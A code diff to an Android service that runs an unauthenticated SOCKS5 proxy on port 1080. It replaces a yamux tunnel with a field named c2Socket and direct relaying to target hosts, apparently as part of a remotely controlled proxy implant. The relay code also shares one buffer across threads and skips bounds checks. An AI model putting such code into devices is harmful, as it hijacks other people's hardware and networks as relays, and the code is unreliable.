@@ -10,16 +10,13 @@ import java.net.*;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
-import com.github.hashicorp.yamux.Session;
-import com.github.hashicorp.yamux.Stream;
-
 public class ProxyService extends Service {
     private static final String TAG = "ProxyService";
     private static final int PROXY_PORT = 1080;
     private ServerSocket serverSocket;
     private ExecutorService executor;
     private volatile boolean running = false;
-    private Session yamuxSession;
+    private Socket c2Socket;
 
     @Override
     public void onCreate() {
@@ -28,9 +25,9 @@ public class ProxyService extends Service {
         Log.d(TAG, "ProxyService created");
     }
 
-    public void setYamuxSession(Session session) {
-        this.yamuxSession = session;
-        Log.d(TAG, "Yamux session set");
+    public void setC2Socket(Socket socket) {
+        this.c2Socket = socket;
+        Log.d(TAG, "C2 socket set");
     }
 
     public void startProxy() {
@@ -75,16 +72,15 @@ public class ProxyService extends Service {
         try {
             InputStream in = client.getInputStream();
             OutputStream out = client.getOutputStream();
-            byte[] buffer = new byte[1024];
 
             // SOCKS5 handshake
+            byte[] buffer = new byte[1024];
             int len = in.read(buffer);
             if (len < 1 || buffer[0] != 0x05) {
                 client.close();
                 return;
             }
 
-            // No authentication
             out.write(new byte[]{0x05, 0x00});
             out.flush();
 
@@ -106,12 +102,12 @@ public class ProxyService extends Service {
             int port;
             int addrType = buffer[3];
 
-            if (addrType == 0x01) { // IPv4
+            if (addrType == 0x01) {
                 host = String.format("%d.%d.%d.%d",
                         buffer[4] & 0xFF, buffer[5] & 0xFF,
                         buffer[6] & 0xFF, buffer[7] & 0xFF);
                 port = ((buffer[8] & 0xFF) << 8) | (buffer[9] & 0xFF);
-            } else if (addrType == 0x03) { // Domain
+            } else if (addrType == 0x03) {
                 int nameLen = buffer[4] & 0xFF;
                 host = new String(buffer, 5, nameLen);
                 port = ((buffer[5 + nameLen] & 0xFF) << 8) | (buffer[6 + nameLen] & 0xFF);
@@ -122,25 +118,11 @@ public class ProxyService extends Service {
 
             Log.d(TAG, "SOCKS5: " + host + ":" + port);
 
-            // Open a new Yamux stream
-            Stream stream = yamuxSession.openStream();
-            OutputStream proxyOut = stream.getOutputStream();
-            InputStream proxyIn = stream.getInputStream();
+            // Connect to destination
+            Socket target = new Socket();
+            target.connect(new InetSocketAddress(host, port), 10000);
 
-            // Send PROXY command through the stream
-            proxyOut.write(("PROXY " + host + " " + port + "\n").getBytes());
-            proxyOut.flush();
-
-            // Wait for CONNECTED response
-            BufferedReader reader = new BufferedReader(new InputStreamReader(proxyIn));
-            String response = reader.readLine();
-            if (response == null || !response.equals("CONNECTED")) {
-                stream.close();
-                client.close();
-                return;
-            }
-
-            // Send SOCKS5 success
+            // Send success
             byte[] success = new byte[10];
             success[0] = 0x05;
             success[1] = 0x00;
@@ -149,43 +131,46 @@ public class ProxyService extends Service {
             out.write(success);
             out.flush();
 
-            // Relay data between client and stream
-            relayData(client, proxyIn, proxyOut);
+            // Relay data
+            relayData(client, target);
 
         } catch (Exception e) {
             Log.e(TAG, "Proxy error: " + e.getMessage());
         }
     }
 
-    private void relayData(Socket client, InputStream proxyIn, OutputStream proxyOut) {
+    private void relayData(Socket client, Socket target) {
         try {
-            InputStream clientIn = client.getInputStream();
-            OutputStream clientOut = client.getOutputStream();
+            InputStream in1 = client.getInputStream();
+            OutputStream out1 = client.getOutputStream();
+            InputStream in2 = target.getInputStream();
+            OutputStream out2 = target.getOutputStream();
+
             byte[] buffer = new byte[8192];
             boolean[] closed = {false};
 
-            // Client -> Proxy
             Thread t1 = new Thread(() -> {
                 try {
                     int len;
-                    while ((len = clientIn.read(buffer)) != -1) {
-                        proxyOut.write(buffer, 0, len);
-                        proxyOut.flush();
+                    while ((len = in1.read(buffer)) != -1) {
+                        out2.write(buffer, 0, len);
+                        out2.flush();
                     }
                 } catch (Exception e) {}
                 closed[0] = true;
+                closeSockets(client, target);
             });
 
-            // Proxy -> Client
             Thread t2 = new Thread(() -> {
                 try {
                     int len;
-                    while ((len = proxyIn.read(buffer)) != -1) {
-                        clientOut.write(buffer, 0, len);
-                        clientOut.flush();
+                    while ((len = in2.read(buffer)) != -1) {
+                        out1.write(buffer, 0, len);
+                        out1.flush();
                     }
                 } catch (Exception e) {}
                 closed[0] = true;
+                closeSockets(client, target);
             });
 
             t1.start();
@@ -195,11 +180,14 @@ public class ProxyService extends Service {
                 Thread.sleep(100);
             }
 
-            try { client.close(); } catch (Exception e) {}
-
         } catch (Exception e) {
             Log.e(TAG, "Relay error: " + e.getMessage());
         }
+    }
+
+    private void closeSockets(Socket s1, Socket s2) {
+        try { s1.close(); } catch (Exception e) {}
+        try { s2.close(); } catch (Exception e) {}
     }
 
     @Override
